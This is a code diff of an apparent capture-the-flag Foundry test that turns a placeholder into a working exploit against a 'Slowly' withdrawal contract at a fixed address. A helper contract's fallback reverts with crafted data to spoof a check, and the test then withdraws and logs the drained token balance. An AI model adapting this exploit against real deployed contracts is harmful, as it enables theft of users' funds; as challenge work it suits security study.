@@ -3,7 +3,7 @@ pragma solidity ^0.8.13;
 
 import {Test, console} from "forge-std/Test.sol";
 
-contract CTFTest5 is Test {
+contract CTFSlowly is Test {
     uint256 pk;
     address user;
     string rpc;
@@ -13,27 +13,47 @@ contract CTFTest5 is Test {
         user = vm.envAddress("ADDR");
         rpc = vm.envString("RPC");
 
-        vm.createSelectFork(rpc);
-
-        console.log("BLOCK", block.number);
-        console.log("TIME ", block.timestamp);
-        console.log();
+        vm.createSelectFork(rpc, 6613341);
     }
 
-    function testCTF5() public {
+    function testSlowly() public {
         vm.startPrank(user);
 
         Pranker pranker = new Pranker();
-        pranker.prank();
+
+        ISlowly slowly = ISlowly(0x39Ff56383DAe3c0198Ab98c0Da093980e611d3C2);
+        address token = 0xF3aF54943d6ef98c2B083FC6e69d36019ee5459D;
+
+        slowly.delayWithdrawal(100 ether);      // 1
+        slowly.addFunds(address(pranker), 420); // 2
+
+        uint balanceBefore = IERC20(token).balanceOf(user);
+
+        slowly.withdraw();                      // 3
+
+        console.log("ROBA2", IERC20(token).balanceOf(user) - balanceBefore);
     }
 }
 
-contract Pranker {
-    constructor() {
-        // 
-    }
+interface IERC20 {
+    function balanceOf(address) external returns (uint);
+}
 
-    function prank() external {
-        // 
+contract Pranker {
+    fallback() external {
+        assembly {
+            mstore(0, 0x5303ed8200000000000000000000000000000000000000000000000000000000)
+            revert (0, 0x20)
+        }
     }
+}
+
+interface ISlowly {
+    function addFunds(address _from, uint256 _amount) external;
+    function withdraw() external;
+    function enableWithdrawals() external returns (bool);
+    function nextWithdrawalTimestamp() external returns (uint256);
+  function delayWithdrawal(
+    uint256 _delayBySeconds
+  ) external;
 }
